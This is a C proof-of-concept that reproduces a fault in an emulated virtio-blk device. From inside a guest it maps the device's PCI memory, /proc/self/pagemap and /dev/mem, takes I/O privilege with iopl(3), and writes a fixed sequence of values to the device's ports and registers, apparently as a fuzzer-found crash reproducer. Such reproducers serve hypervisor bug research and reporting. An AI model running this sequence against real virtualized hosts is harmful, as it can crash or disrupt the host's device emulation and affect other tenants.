#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_writed(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

void mmio_writew(uint32_t addr, uint16_t value) {
    *((uint16_t *)(mmio_mem + addr)) = value;
}

void mmio_writeb(uint32_t addr, uint8_t value) {
    *((uint8_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_readd(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

uint16_t mmio_readw(uint16_t addr) {
    return *((uint16_t *)(mmio_mem + addr));
}

uint8_t mmio_readb(uint8_t addr) {
    return *((uint8_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// VirtIO specific structs
//

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce virtio-blk-00: start\n[+]\n");

    // lspci -v
    // 00:03.0 SCSI storage controller: Red Hat, Inc. Virtio block device
    // Flags: bus master, fast devsel, latency 0, IRQ 23
    // I/O ports at c000 [size=128]
    // Memory at febd2000 (32-bit, non-prefetchable) [size=4K]
    // Memory at fe004000 (64-bit, prefetchable) [size=16K] 
    // # cat /sys/devices/pci0000:00/0000:00:03.0/resource
    // 0x000000000000c000 0x000000000000c07f 0x0000000000040101
    // 0x00000000febd2000 0x00000000febd2fff 0x0000000000040200
    // 0x0000000000000000 0x0000000000000000 0x0000000000000000
    // 0x0000000000000000 0x0000000000000000 0x0000000000000000
    // 0x00000000fe004000 0x00000000fe007fff 0x000000000014220c
    // 0x0000000000000000 0x0000000000000000 0x0000000000000000
    // 0x0000000000000000 0x0000000000000000 0x0000000000000000
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource4", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // GDB
    // gef config context.nb_lines_backtrace 2
 
    iopl(3);

    // reset
    outl(0x0, 0xc008);

    outl(0x7e83a579, 0xc008);
    mmio_writeb(0x18, 0x6e);
    outl(0x2443a858, 0xc004);
    mmio_writeb(0x18, 0xea);
    mmio_writed(0x3000, 0x214c8698);
    sleep(1);

    printf("[+]\n[+] Reproduce virtio-blk-00: fail\n[+]\n");

    return 0;
}
